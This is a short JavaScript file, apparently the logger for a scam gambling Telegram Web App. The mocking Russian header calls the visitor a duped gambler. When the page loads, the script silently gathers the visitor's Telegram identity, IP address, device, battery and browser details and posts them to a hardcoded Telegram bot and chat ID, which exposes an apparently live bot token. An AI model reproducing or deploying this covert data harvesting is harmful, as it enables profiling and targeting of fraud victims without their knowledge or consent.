async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error('Ошибка сети при получении IP');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Ошибка получения IP-адреса:', error);
        return 'Не удалось получить IP';
    }
}

function getUserAgent() {
    return navigator.userAgent;
}

function getOSName() {
    return navigator.platform;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Ошибка получения информации о батарее:', error);
        return 'Не удалось получить данные о батарее';
    }
}

function getBrowserInfo() {
    return {
        name: navigator.appName,
        version: navigator.appVersion,
        engine: navigator.product
    };
}

async function sendDataToTelegram() {
    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();
    let tg = window.Telegram.WebApp;

    const message = `
<b>🚀 Наебан в ракетке!</b>

<b>🔍 Лудик ахмед:</b>
├ Тег: @${tg.initDataUnsafe.user.username}
├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
├ Имя: <code>${tg.initDataUnsafe.user.first_name}</code>
├ Фамилия: <code>${tg.initDataUnsafe.user.last_name}</code>
├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>

<b>📱 Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>undefined</code>
├ ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Заряд батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🛜 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
    `;

    const token = '7574202818:AAHVjCaM_TC3DetXdBBY4u6MublTuNk3O8E'; // Не забудьте хранить токен безопасно
    const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
    const chatId = '-1002380319804'; // Храните ID чата безопасно

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('text', message);
    formData.append('parse_mode', 'HTML');

    try {
        await fetch(telegramBotURL, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.error('Ошибка отправки данных в Telegram:', error);
    }
}

sendDataToTelegram();
